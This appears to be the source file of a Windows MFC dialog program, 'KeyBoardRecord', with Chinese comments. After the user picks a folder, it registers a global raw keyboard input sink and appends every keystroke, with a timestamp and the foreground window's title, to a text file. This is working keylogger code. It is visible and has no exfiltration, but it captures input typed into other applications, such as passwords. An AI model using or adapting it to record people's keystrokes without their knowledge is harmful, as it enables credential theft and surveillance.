
// KeyBoardRecordDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "KeyBoardRecord.h"
#include "KeyBoardRecordDlg.h"
#include "afxdialogex.h"
#include "VirtualKeyMapString.h"

#include<iostream>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CKeyBoardRecordDlg 对话框



CKeyBoardRecordDlg::CKeyBoardRecordDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_KEYBOARDRECORD_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CKeyBoardRecordDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CKeyBoardRecordDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CKeyBoardRecordDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CKeyBoardRecordDlg::OnBnClickedButton2)
	ON_WM_INPUT()
	ON_BN_CLICKED(IDC_BUTTON3, &CKeyBoardRecordDlg::OnBnClickedButton3)
//	ON_WM_LBUTTONDOWN()
//	ON_WM_MOUSEMOVE()
END_MESSAGE_MAP()


// CKeyBoardRecordDlg 消息处理程序

BOOL CKeyBoardRecordDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	ModifyStyle(m_hWnd, WS_THICKFRAME, 0, 0);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CKeyBoardRecordDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CKeyBoardRecordDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CKeyBoardRecordDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CKeyBoardRecordDlg::OnBnClickedButton1()
{
	TCHAR szBuffer[MAX_PATH]{};
	BROWSEINFO bi{};
	bi.hwndOwner = ::GetForegroundWindow();
	bi.pszDisplayName = szBuffer;
	bi.pidlRoot = NULL; //默认选中的根路径
	bi.lpszTitle = L"标题";
	bi.ulFlags = BIF_NEWDIALOGSTYLE;

	LPITEMIDLIST idl = SHBrowseForFolder(&bi);

	if (NULL == idl)
	{
		return;
	}

	SHGetPathFromIDList(idl, szBuffer);

	lstrcat(szBuffer, L"\\keyboard.txt");

	SetDlgItemText(IDC_EDIT1, szBuffer);
}


void CKeyBoardRecordDlg::OnBnClickedButton2()
{
	TCHAR szFilePath[MAX_PATH]{};

	((CEdit*)GetDlgItem(IDC_EDIT1))->GetWindowTextW(szFilePath, MAX_PATH);

	if (lstrlenW(szFilePath) == 0)
	{
		AfxMessageBox(L"请选择文件路径");
		return;
	}

	//主要用到RegisterRawInputDevices(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerrawinputdevices)

	//设置RAWINPUTDEVICE 结构体的信息
	RAWINPUTDEVICE rawInputDevice{};
	rawInputDevice.usUsagePage = 0x01; //指向原始输入设备的顶级集合使用的页面
	rawInputDevice.usUsage = 0x06;  //指向原始输入设备的顶级集合的用法
	rawInputDevice.dwFlags = RIDEV_INPUTSINK;   //模式标志 指定如何解释由usUsagePage和usUsage提供的信息 RIDEV_INPUTSINK表示即使程序不处于上层窗口或是激活窗口，程序依然可以接收原始输入，但是，结构体成员hwndTarget必须要指定
	rawInputDevice.hwndTarget = m_hWnd; //指向目标窗口的句柄，如果是NULL，则它会遵循键盘焦点

	//注册原始输入设备
	BOOL bRet = ::RegisterRawInputDevices(&rawInputDevice, 1, sizeof(rawInputDevice));

	if (FALSE == bRet)
	{
		AfxMessageBox(L"注册失败");
	}
}


/// <summary>
/// 处理WM_INPUT消息
/// </summary>
/// <param name="nInputcode"></param>
/// <param name="hRawInput"></param>
void CKeyBoardRecordDlg::OnRawInput(UINT nInputcode, HRAWINPUT hRawInput)
{
	// 该功能要求使用 Windows XP 或更高版本。
	// 符号 _WIN32_WINNT 必须 >= 0x0501。
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	RAWINPUT rawinputData{};
	UINT uiSize = sizeof(rawinputData);

	::GetRawInputData(hRawInput, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));

	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) || (WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			SaveKeyToFile(rawinputData.data.keyboard.VKey);
		}
	}
	//todo register
	else if (RIM_TYPEMOUSE == rawinputData.header.dwType)
	{	
		POINT point{ rawinputData.data.mouse.lLastX ,rawinputData.data.mouse.lLastY };
		
		HWND hwnd = ::ChildWindowFromPoint(m_hWnd, point);

		TCHAR buf[MAX_PATH]{};
		::GetWindowText(hwnd, buf, MAX_PATH);
		AfxMessageBox(buf);
	}

	CDialogEx::OnRawInput(nInputcode, hRawInput);
}

BOOL CKeyBoardRecordDlg::SaveKeyToFile(USHORT usVkey)
{
	TCHAR szKey[MAX_PATH]{};
	TCHAR szTile[MAX_PATH]{};
	TCHAR szText[MAX_PATH]{};
	TCHAR szFile[MAX_PATH]{};

	//获取文件路径
	((CEdit*)GetDlgItem(IDC_EDIT1))->GetWindowTextW(szFile,MAX_PATH);

	//顶层窗口
	HWND hwnd = ::GetForegroundWindow();

	//窗口标题
	::GetWindowText(hwnd, szTile, MAX_PATH);

	//按键字符
	lstrcpy(szKey, GetKeyName(usVkey));

	SYSTEMTIME sysTime{};
	GetLocalTime(&sysTime);
	//写入文件的字符串
	wsprintf(szText, L"[%d/%d/%d %02d:%02d:%02d][%s]- %s\r\n",sysTime.wYear,sysTime.wMonth,sysTime.wDay,sysTime.wHour,sysTime.wMinute,sysTime.wSecond,szTile,szKey);
	
	auto hFile = CreateFile( szFile, FILE_APPEND_DATA, FILE_SHARE_WRITE, nullptr,OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr );
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}

	DWORD dwSize = 0; 
	WORD a = 0xfeff;
	WriteFile(hFile, &a, 2, &dwSize, NULL);
	WriteFile(hFile, szText, lstrlen(szText) * sizeof(TCHAR), &dwSize, NULL);
	CloseHandle(hFile);
	return TRUE;
}


void CKeyBoardRecordDlg::OnBnClickedButton3()
{

}
